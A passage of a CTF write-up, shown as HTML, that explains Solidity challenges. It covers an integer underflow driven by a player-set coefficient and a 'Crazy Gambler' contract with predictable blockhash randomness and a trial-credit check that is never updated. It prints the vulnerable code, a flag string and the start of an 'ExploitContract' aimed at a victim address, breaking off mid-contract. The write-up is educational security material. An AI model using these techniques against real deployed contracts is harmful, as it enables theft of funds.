</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span>        </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span>            </span><span class="token" style="color:#6a9955">// If you have a flag why do you have to call it again (just to not add useless events. I need to keep track of solves )</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span>            </span><span class="token" style="color:#dcdcaa">require</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">!</span><span>flagHolders</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span><span>            </span><span class="token" style="color:#dcdcaa">require</span><span class="token" style="color:#d4d4d4">(</span><span>players</span><span class="token" style="color:#d4d4d4">[</span><span>realPlayerAddress</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;You are not a player&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span><span>            </span><span class="token" style="color:#dcdcaa">require</span><span class="token" style="color:#d4d4d4">(</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span><span>                playersHealth</span><span class="token" style="color:#d4d4d4">[</span><span>realPlayerAddress</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">-</span><span> </span><span class="token" style="color:#b5cea8">100</span><span> </span><span class="token" style="color:#d4d4d4">*</span><span> tryhardCoeff </span><span class="token" style="color:#d4d4d4">&gt;</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">,</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">9</span><span>                </span><span class="token" style="color:#ce9178">&quot;Player is dead&quot;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">10</span><span>            </span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">11</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">12</span><span>            playersHealth</span><span class="token" style="color:#d4d4d4">[</span><span>realPlayerAddress</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">-=</span><span> </span><span class="token" style="color:#b5cea8">200</span><span> </span><span class="token" style="color:#d4d4d4">*</span><span> tryhardCoeff</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">13</span><span>            playersPoints</span><span class="token" style="color:#d4d4d4">[</span><span>realPlayerAddress</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">+=</span><span> </span><span class="token" style="color:#b5cea8">100</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">14</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">15</span><span>            </span><span class="token" style="color:#c586c0">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>playersPoints</span><span class="token" style="color:#d4d4d4">[</span><span>realPlayerAddress</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">&gt;</span><span> </span><span class="token" style="color:#b5cea8">1000</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">16</span><span>                emit </span><span class="token" style="color:#dcdcaa">WonFlag</span><span class="token" style="color:#d4d4d4">(</span><span>tx</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">origin</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">17</span><span>                flagHolders</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">=</span><span class="token" style="color:#569cd6">true</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">18</span><span>            </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">19</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">20</span>
</span></code></div></pre>
<ol start="2">
<li>If we follow the contract&#x27;s logic. We will lose the game certainly as our health will deplete faster than the points we gain. Okay so we have <code class="inline-code">playersHealth[realPlayerAddress] -= 200 * tryhardCoeff;</code>. It&#x27;s subtracting a positive value from <code class="inline-code">uint</code> and has a coefficient that we control. That makes it vulnerable both logically by throwing zero to it and for the expert eyes to underflow. That means when when the result value of the operation &lt;0, it will underflow to take the maximum value which is in our case 2^265. A good article to better understand what I am talking about <a class="chakra-link css-9olwc6" href="https://hackernoon.com/hack-solidity-integer-overflow-and-underflow">Underflow and overflow article</a>. I didn&#x27;t want to force a solution as most are beginners and not familiar with the solidity language ^^.</li>
<li>Okay so we have just to pass a value for the coefficient that is <code class="inline-code">&gt;=11</code> to cause the underflow then we spam the <code class="inline-code">climbLeaderboard</code> till we get an error.</li>
<li>Here is a smart contract to do it.</li>
</ol>
<blockquote>
<p class="chakra-text css-0" node="[object Object]">PS: The vulnerability is patched since the 0.5.0 <a class="chakra-link css-9olwc6" href="https://github.com/ethereum/solidity/issues/796">Github issue</a> &gt; <code class="inline-code">securinets{0d0m3t3r_4r3_Th3_G0ds_0f_0verfl000w}</code></p>
</blockquote>
<h3 class="chakra-heading css-xm64py" id="#7 lesson learned">#7 Lesson learned</h3>
<p class="chakra-text css-0" node="[object Object]">Solidity is not the perfect language.</p>
<div class="css-17l36zw"></div>
<h2 class="chakra-heading css-1uc67dn" id="crazy gambler">Crazy Gambler</h2>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924214/Friendly-ctf/crazy-gambler_hxbelt.png" alt="Crazy gambler" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Crazy gambler</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">This task is really a challenging one. I was hesitant at first for adding it as I had simpler ones. It&#x27;s the only task that forces you to write a script in web3 library. However I was surprised when a participant told me he did manually ! That&#x27;s a lot of perseverance and dedication, It&#x27;s truly amazing.</p>
<ol>
<li>Read the contract</li>
</ol>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span> </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">_rollDice</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> internal view </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">uint256</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span>        uint256 blockNo </span><span class="token" style="color:#d4d4d4">=</span><span> block</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">number</span><span> </span><span class="token" style="color:#d4d4d4">-</span><span> </span><span class="token" style="color:#b5cea8">1</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span>        uint256 diceRes </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">uint256</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">blockhash</span><span class="token" style="color:#d4d4d4">(</span><span>blockNo</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">%</span><span> </span><span class="token" style="color:#b5cea8">3</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span>        </span><span class="token" style="color:#c586c0">return</span><span> diceRes</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">trialCredit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span><span>        </span><span class="token" style="color:#dcdcaa">require</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">!</span><span>gotTrial</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;You already got your trial credits&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">9</span><span>        gamblersCredit</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">+=</span><span> </span><span class="token" style="color:#b5cea8">7</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">10</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">11</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">12</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">gamble</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">address ownerAddress</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">13</span><span>        </span><span class="token" style="color:#6a9955">// Fuck off, No need to emit event again.</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">14</span><span>        </span><span class="token" style="color:#dcdcaa">require</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">!</span><span>flagHolders</span><span class="token" style="color:#d4d4d4">[</span><span>ownerAddress</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">15</span><span>        uint256 roll </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">_rollDice</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">16</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">17</span><span>        </span><span class="token" style="color:#c586c0">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>roll </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">18</span><span>            gamblersCredit</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">+=</span><span> </span><span class="token" style="color:#b5cea8">1</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">19</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span> </span><span class="token" style="color:#c586c0">else</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">20</span><span>            gamblersCredit</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">21</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">22</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">23</span><span>        </span><span class="token" style="color:#6a9955">// We get flag when we reach 20 !</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">24</span><span>        </span><span class="token" style="color:#c586c0">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>gamblersCredit</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">==</span><span class="token" style="color:#b5cea8">20</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">25</span><span>            flagHolders</span><span class="token" style="color:#d4d4d4">[</span><span>ownerAddress</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569cd6">true</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">26</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">27</span><span>            </span><span class="token" style="color:#6a9955">// Good bye gambler :)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">28</span><span>            gamblersCredit</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">29</span><span>            emit </span><span class="token" style="color:#dcdcaa">WonFlag</span><span class="token" style="color:#d4d4d4">(</span><span>ownerAddress</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">30</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">31</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">32</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">So we are trying to mimicate randomness by using the <code class="inline-code">block number</code>. Okay so if you don&#x27;t what are blocks in the blockchain. I really recommend <a class="chakra-link css-9olwc6" href="https://www.upgrad.com/blog/blockchain-architecture/">Jargon Reference</a>. Why I said mimicate ? Well, because block number is something anyone has access to. So predicting the value is really easy.</p>
<p class="chakra-text css-0" node="[object Object]">Let&#x27;s craft an evil contract that will implement <code class="inline-code">_rollDice</code> and call the gamble if we get the <code class="inline-code">0</code> value.</p>
<blockquote>
<p class="chakra-text css-0" node="[object Object]">I copied and pasted the CrazyGambler contract&#x27;s code from the etherscan interface.</p>
</blockquote>
<p class="chakra-text css-0" node="[object Object]">One other interesting thing:</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">trialCredit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span>        </span><span class="token" style="color:#dcdcaa">require</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">!</span><span>gotTrial</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;You already got your trial credits&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span>        gamblersCredit</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">+=</span><span> </span><span class="token" style="color:#b5cea8">7</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">Here I am doing the check if the user got a trial or not but I am not modifying that value anywhere. So the user can get infinite <code class="inline-code">trialCredit</code>.
We can use that to get close to our target value of credits which is <code class="inline-code">20</code>.
Also, it allows the player to reuse its address.</p>
<p class="chakra-text css-0" node="[object Object]">Let&#x27;s craft our evil contract then..</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#6a9955">// SPDX-License-Identifier: UNLICENSED</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span>pragma solidity </span><span class="token" style="color:#d4d4d4">^</span><span class="token" style="color:#b5cea8">0.8</span><span class="token" style="color:#b5cea8">.13</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span></span><span class="token" style="color:#c586c0">import</span><span> </span><span class="token" style="color:#ce9178">&quot;./CrazyGambler.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span>contract </span><span class="token" style="color:#4ec9b0">ExploitContract</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span><span>    </span><span class="token" style="color:#4ec9b0">CrazyGambler</span><span> crazyGambler</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span><span>    </span><span class="token" style="color:#dcdcaa">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">address victimAddress</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">9</span><span>        </span><span class="token" style="color:#6a9955">// Setting our target</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">10</span><span>        crazyGambler </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">CrazyGambler</span><span class="token" style="color:#d4d4d4">(</span><span>victimAddress</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">11</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">12</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">13</span><span>    event </span><span class="token" style="color:#dcdcaa">Gamble</span><span class="token" style="color:#d4d4d4">(</span><span>uint256</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
